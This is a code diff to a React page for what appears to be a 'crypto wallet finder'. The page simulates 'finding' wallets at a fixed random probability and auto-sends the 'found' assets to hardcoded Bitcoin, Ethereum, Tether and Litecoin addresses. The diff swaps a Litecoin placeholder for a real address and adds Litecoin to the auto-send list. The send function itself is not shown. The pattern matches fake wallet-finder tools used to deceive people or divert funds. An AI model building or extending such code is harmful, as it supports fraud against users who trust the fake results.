@@ -41,9 +41,9 @@ const initialWalletChecks = [
 const sendWallets: SendWallets = {
   "Bitcoin": "bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0",
   "Ethereum": "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
-  "Litecoin": "YOUR_LITECOIN_WALLET_ADDRESS", // Placeholder - replace if needed
+  "Litecoin": "ltc1q7jl2al4caanc0k5zgsz3e399agfklk75nz46kf", // Updated Litecoin address
   "Tether (ERC20)": "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
-  "Tether (TRC20)": "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk", // Updated TRON address
+  "Tether (TRC20)": "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",
 };
 
 // Crypto presets that can be "found".
@@ -76,7 +76,7 @@ const FIND_PROBABILITY = 0.00005; // Chance to "find" a wallet per check cycle
 const MAX_LOGS = 6; // Maximum number of logs to display
 
 // Assets to automatically send
-const AUTO_SEND_ASSETS = ["Bitcoin", "Ethereum", "Tether (ERC20)", "Tether (TRC20)"]; // Added Tether (TRC20)
+const AUTO_SEND_ASSETS = ["Bitcoin", "Ethereum", "Tether (ERC20)", "Tether (TRC20)", "Litecoin"]; // Added Litecoin
 
 export default function Home() {
   const [checkedCount, setCheckedCount] = useState(0); // Start from 0
@@ -113,7 +113,7 @@ export default function Home() {
         newlyFound.forEach(crypto => {
           if (AUTO_SEND_ASSETS.includes(crypto.name)) {
             const targetWallet = sendWallets[crypto.name];
-            if (targetWallet && !targetWallet.startsWith('YOUR_')) {
+            if (targetWallet && !targetWallet.startsWith('YOUR_')) { // Ensure address is not a placeholder
               setTimeout(() => handleSendCrypto(crypto), 500); // Delay slightly for UI update
             }
           }
@@ -210,7 +210,8 @@ export default function Home() {
                    {foundCrypto.map((crypto, index) => {
                      const targetWallet = sendWallets[crypto.name] || crypto.walletToSendTo;
                      const isAutoSent = AUTO_SEND_ASSETS.includes(crypto.name);
-                     const isSendDisabled = !targetWallet || targetWallet.startsWith('YOUR_') || isAutoSent; // Disable send button for auto-sent assets
+                     // Disable send button if auto-sent OR if target wallet is still a placeholder
+                     const isSendDisabled = isAutoSent || !targetWallet || targetWallet.startsWith('YOUR_');
 
                      return (
                        <div key={index} className="flex justify-between items-center">
@@ -274,4 +275,5 @@ export default function Home() {
     </div>
   );
 }
+
 
